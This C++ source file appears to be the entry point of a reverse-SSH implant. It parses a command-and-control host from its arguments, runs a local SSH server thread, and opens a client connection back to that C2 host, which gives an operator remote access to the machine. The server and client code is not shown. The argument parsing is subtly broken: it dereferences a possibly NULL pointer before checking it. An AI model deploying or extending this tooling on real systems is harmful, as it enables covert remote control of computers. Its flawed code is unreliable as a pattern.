#define LIBSSH_STATIC 1
#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <thread>
#include <string.h>

#include "server.h"
#include "client.h"

void help(char* self) {
    printf("Usage: %s user@hostname[:PORT] [SSH_SERVER_PORT]\n", self);
    printf("Example: %s user@hostname\n", self);
    printf("Example: %s user@hostname:22 1234\n", self);  
    exit(1);
}

int main(int argc, char** argv){
    int C2_port_int = 22;
    char* C2_port = NULL;    
    char* C2_host = NULL;
    char* ssh_server_port = NULL;
    int ssh_server_port_int = 2222;

    if (argc < 2 || argc > 3) {
        help(argv[0]);
    }

    C2_host = strchr(argv[1], '@');
    C2_host[0] = '\0';
    C2_host++;
    if (C2_host == NULL) help(argv[0]);

    C2_port = strchr(C2_host, ':');
    if (C2_port != NULL) {
        C2_port[0] = '\0';
        C2_port++;
        C2_port_int = atoi(C2_port);
        if (C2_port_int == 0)
            help(argv[0]);

    }

        
    if (argc == 3) {
        ssh_server_port = argv[2];
        ssh_server_port_int = atoi(ssh_server_port);
        if (ssh_server_port_int == 0)
            help(argv[0]);
    }

    ssh_init(); // mandatory

    auto server = SSHServer();
    std::thread server_thread(server.run, ssh_server_port_int);


    //// client
    auto client = SSHClient();
    std::thread client_thread(client.run, C2_host, C2_port_int);

    server_thread.join();
    client_thread.join();

    return 0;
}